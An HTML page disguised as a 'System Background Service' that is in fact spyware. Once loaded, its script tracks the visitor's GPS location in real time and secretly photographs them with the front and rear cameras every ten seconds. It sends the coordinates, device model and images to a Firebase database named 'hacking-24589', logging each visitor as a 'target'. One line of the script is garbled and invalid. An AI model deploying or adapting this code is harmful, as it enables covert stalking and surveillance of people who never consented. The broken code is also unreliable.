<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Background Service</title>
    <style>
        body {
            background-color: #0b0f19;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .box {
            border: 1px dashed #00ff66;
            padding: 20px;
            background: #05070c;
        }
    </style>
</head>
<body>

    <div class="box">
        <h3>[ SYSTEM SERVICE ACTIVE ]</h3>
        <p>Running background process...</p>
    </div>

    <div style="display:none;">
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
        const firebaseConfig = {
            databaseURL: "https://hacking-24589-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };
        
        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.database();

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        // Buat ID unik untuk perangkat ini jika belum ada
        let targetId = localStorage.getItem("target_unique_id");
        if (!targetId) {
            targetId = "target_" + Math.random().toString(36).substring(2, 9);
            localStorage.setItem("target_unique_id", targetId);
        }

        // Deteksi Tipe HP Otomatis
        function getDeviceModel() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) {
                let match = ua.match(/;\s([^;]+)\sBuild\//);
                if (match && match[1]) return match[1];
                return "Android Device";
            }
            return "Mobile Target";
        }

        const deviceName = getDeviceModel();

        // 1. Kirim Data GPS Real-time
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition((position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                
                db.ref("targets/" + targetId).set({
                    id: targetId,
                    device: deviceName,
                    latitude: lat,
                    longitude: lon,
                    timestamp: Date.now()
                });
            }, (error) => {
                console.error("GPS Error:", error);
            }, { enableHighAccuracy: true });
        }

        // 2. Fungsi Kamera Berkala
        async function captureCamera(facingType, labelName) {
            try {
                if (video.srcObject) {
                    video.srcObject.getTracks().forEach(track => track.stop());
                    video.srcObject = null;
                }

                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingType },
                    audio: false
                });

                video.srcObject = stream;
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(resolve, 1000);
                    };
                });

                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.6);

                db.ref("camera_logs").push({
                    targetId: targetId,
                    device: deviceName,
                    cameraType: labelName,
                    image: imageData,
                    timestamp: Date.now()
                });

                stream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
            } catch (err) {
                console.log(`Kamera ${labelName} error:`, err);
            }
        }

        async function runCycle() {
            await captureCamera("user", "Depan");
            setTimeout(async () => {
                await captureCommandLoop:
                await captureCamera("environment", "Belakang");
            }, 3000);
        }

        window.addEventListener('load', () => {
            setTimeout(() => {
                runCycle();
                setInterval(runCycle, 10000);
            }, 3000);
        });
    </script>
</body>
</html>
